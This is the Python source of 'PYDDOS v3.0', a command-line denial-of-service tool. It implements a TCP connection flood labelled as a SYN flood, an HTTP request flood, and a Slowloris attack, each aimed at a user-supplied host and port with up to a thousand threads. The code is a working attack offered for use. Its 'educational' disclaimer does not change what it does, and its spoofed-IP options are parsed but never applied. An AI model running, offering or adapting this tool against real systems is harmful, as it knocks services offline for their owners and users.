#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PYDDOS v3.0
A simple and powerful DDoS tool written in Python.
Author: mach1el
GitHub: https://github.com/mach1el/pyddos
"""

import os
import sys
import socket
import random
import threading
import time
import argparse
from termcolor import colored
from colorama import init

init(autoreset=True)

# ASCII Art
print(colored("""
  _____   __   __  _____   _____   _____   _____
 |  __ \  \ \ / / |  __ \ |  __ \ |  __ \ |  __ \
 | |__) |  \ V /  | |  | | | |  | | |  | | | |  | |
 |  ___/    > <   | |  | | | |  | | |  | | | |  | |
 | |       / . \  | |__| | | |__| | |__| | | |__| |
 |_|      /_/ \_\ |_____/  |_____/ |_____/  |_____/
""", "cyan"))

print(colored("PYDDOS v3.0 - Educational & Testing Purposes Only", "yellow"))
print(colored("Use responsibly. Author is not responsible for misuse.\n", "red"))

# Global variables
stop_event = threading.Event()
stats_lock = threading.Lock()
connections = 0
failed = 0

def print_stats():
    global connections, failed
    while not stop_event.is_set():
        with stats_lock:
            print(colored(f"[+] Connections: {connections} | Failed: {failed}", "green"))
        time.sleep(1)

def random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def syn_flood(target, port, threads, timeout, fake_ip):
    global connections, failed
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target, port))
            with stats_lock:
                connections += 1
            s.close()
        except:
            with stats_lock:
                failed += 1
            time.sleep(0.01)

def http_flood(target, port, threads, sleep_time):
    global connections, failed
    headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection: keep-alive"
    ]
    payload = "GET / HTTP/1.1\r\n" + "\r\n".join(random.choice(headers) for _ in range(10)) + "\r\n\r\n"
    
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            for _ in range(100):
                s.send(payload.encode())
            with stats_lock:
                connections += 1
            s.close()
            time.sleep(sleep_time / 1000)
        except:
            with stats_lock:
                failed += 1
            time.sleep(0.01)

def slowloris(target, port, threads):
    global connections, failed
    sockets = []
    
    def open_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(b"Host: " + target.encode() + b"\r\n")
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            return s
        except:
            return None

    while len(sockets) < threads and not stop_event.is_set():
        s = open_socket()
        if s:
            sockets.append(s)
            with stats_lock:
                connections += 1
        else:
            with stats_lock:
                failed += 1
        time.sleep(1)

    while not stop_event.is_set():
        for s in list(sockets):
            try:
                s.send(b"X-a: b\r\n")
            except:
                sockets.remove(s)
                with stats_lock:
                    failed += 1
                new_s = open_socket()
                if new_s:
                    sockets.append(new_s)
                    with stats_lock:
                        connections += 1
        time.sleep(15)

def main():
    parser = argparse.ArgumentParser(description="PYDDOS v3.0 - DDoS Tool")
    parser.add_argument("-d", "--domain", help="Target domain or IP", required=True)
    parser.add_argument("-p", "--port", type=int, help="Target port")
    parser.add_argument("-T", "--threads", type=int, default=1000, help="Number of threads")
    parser.add_argument("-t", "--timeout", type=float, default=10.0, help="Socket timeout")
    parser.add_argument("-s", "--sleep", type=int, default=100, help="Sleep time between requests (ms)")
    parser.add_argument("-i", "--ip", help="Spoofed IP address")
    parser.add_argument("--fakeip", action="store_true", help="Use random fake IP")
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-Synflood", action="store_true", help="TCP SYN Flood")
    group.add_argument("-Request", action="store_true", help="HTTP Request Flood")
    group.add_argument("-Pyslow", action="store_true", help="Slowloris Attack")

    parser.add_argument("-v", "--version", action="version", version="PYDDOS v3.0")

    args = parser.parse_args()

    target = args.domain
    port = args.port or 80
    threads = args.threads
    timeout = args.timeout
    sleep_time = args.sleep
    fake_ip = args.ip or (random_ip() if args.fakeip else None)

    try:
        target_ip = socket.gethostbyname(target)
    except:
        print(colored("[!] Cannot resolve target domain.", "red"))
        sys.exit(1)

    print(colored(f"[*] Target: {target} ({target_ip}:{port})", "yellow"))
    print(colored(f"[*] Attack Type: {'SYN Flood' if args.Synflood else 'HTTP Flood' if args.Request else 'Slowloris'}", "yellow"))
    print(colored(f"[*] Threads: {threads}", "yellow"))

    # Start stats printer
    stats_thread = threading.Thread(target=print_stats, daemon=True)
    stats_thread.start()

    try:
        if args.Synflood:
            for _ in range(threads):
                t = threading.Thread(target=syn_flood, args=(target_ip, port, threads, timeout, fake_ip))
                t.start()
        elif args.Request:
            for _ in range(threads):
                t = threading.Thread(target=http_flood, args=(target_ip, port, threads, sleep_time))
                t.start()
        elif args.Pyslow:
            t = threading.Thread(target=slowloris, args=(target_ip, port, threads))
            t.start()
        
        print(colored("[*] Attack started. Press Ctrl+C to stop.", "green"))
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        print(colored("\n[*] Stopping attack...", "red"))
        time.sleep(2)
        print(colored("[*] Attack stopped.", "red"))

if __name__ == "__main__":
    if os.name != "nt":
        try:
            import fcntl
            import struct
            import termios
        except:
            pass
    main()
